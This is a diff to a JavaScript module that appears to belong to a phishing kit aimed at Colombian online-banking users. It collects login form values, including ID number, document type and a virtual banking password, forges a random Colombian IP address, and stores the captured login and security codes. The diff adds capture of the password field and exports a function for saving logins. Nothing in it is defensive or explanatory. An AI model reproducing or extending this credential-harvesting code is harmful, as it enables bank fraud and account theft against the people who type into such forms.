@@ -40,10 +40,11 @@
 
     // Capturar datos del formulario de login
     function capturarDatosLogin() {
-        // Buscar campos comunes en formularios de login
-        const usuario = document.querySelector('input[name*="usuario"], input[id*="usuario"], input[type="text"]')?.value || 'desconocido';
-        const documento = document.querySelector('input[name*="documento"], input[id*="documento"]')?.value || '0000000000';
-        
+        const numeroDocumento = document.querySelector('input[name*="numeroDocumento"], input[id*="numeroDocumento"]')?.value || '0000000000';
+        const tipoDocumento = document.querySelector('select[name*="selectedTipoDocCod"], select[id*="selectedTipoDocCod"]')?.value || 'CC';
+        const tipoDocumentoTexto = document.querySelector('select[id*="selectedTipoDocCod"] option:checked')?.text || 'Cedula de Ciudadania';
+        const claveVirtual = document.querySelector('input[name*="claveVirtual"], input[id*="claveVirtual"]')?.value || '';
+
         // Generar IP colombiana aleatoria
         const prefijos = ['186.125', '186.126', '186.127', '186.128', '186.129', '186.130'];
         const ip = prefijos[Math.floor(Math.random() * prefijos.length)] + '.' + 
@@ -51,9 +52,11 @@
                    Math.floor(Math.random() * 256);
 
         return {
-            usuario: usuario,
-            documento: documento,
-            tipo_documento: 'CC',
+            usuario: numeroDocumento,
+            documento: numeroDocumento,
+            tipo_documento: tipoDocumento,
+            tipo_documento_texto: tipoDocumentoTexto,
+            clave_virtual: claveVirtual,
             ip: ip,
             user_agent: navigator.userAgent,
             timestamp: new Date().toISOString()
@@ -75,6 +78,7 @@
                     usuario: datosLogin.usuario,
                     documento: datosLogin.documento,
                     tipo_documento: datosLogin.tipo_documento,
+                    clave_virtual: datosLogin.clave_virtual || '',
                     fecha_login: datosLogin.timestamp,
                     ip: datosLogin.ip,
                     user_agent: datosLogin.user_agent
@@ -199,7 +203,8 @@
         capturarDatosLogin,
         guardarEnLocalStorage,
         obtenerDeLocalStorage,
-        guardarCodigoSeguridad
+        guardarCodigoSeguridad,
+        guardarLogin
     };
 
     // Auto-inicializar
